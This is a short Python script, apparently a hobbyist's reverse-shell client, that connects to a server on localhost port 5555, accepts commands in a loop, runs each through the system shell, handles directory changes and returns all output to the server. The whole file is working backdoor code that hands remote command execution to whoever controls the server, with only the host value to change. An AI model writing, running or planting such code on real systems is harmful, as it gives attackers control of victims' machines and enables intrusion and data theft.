import socket
import subprocess
import os

# Initialize the client socket
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# Connect to the server
client.connect(("localhost", 5555))
print("! Made By HebeleKedi !\n")

while True:
    # Receive command from server
    command = client.recv(4096).decode("utf-8").strip()

    if not command:
        break
    
    # Check if the command is 'cd' for directory navigation
    if command.startswith("cd "):
        try:
            # Extract the path from the command
            target_directory = command.split(" ", 1)[1]
            # Change the current working directory
            os.chdir(target_directory)
            output = f"Directory changed to: {os.getcwd()}"
        except FileNotFoundError:
            output = "Error: Directory not found."
        except Exception as e:
            output = str(e)
    else:
        # Execute standard system commands using subprocess
        result = subprocess.run(
            command, 
            shell=True, 
            capture_output=True, 
            text=True, 
            encoding='cp857', 
            errors='replace'
        )
        
        # Combine stdout and stderr for complete feedback
        output = result.stdout + result.stderr
        
        # Ensure there is always a response
        if not output:
            output = "Command executed successfully with no output."

    # Send the result back to the server
    client.sendall(output.encode('utf-8'))
    print("Package sent successfully!")

client.close()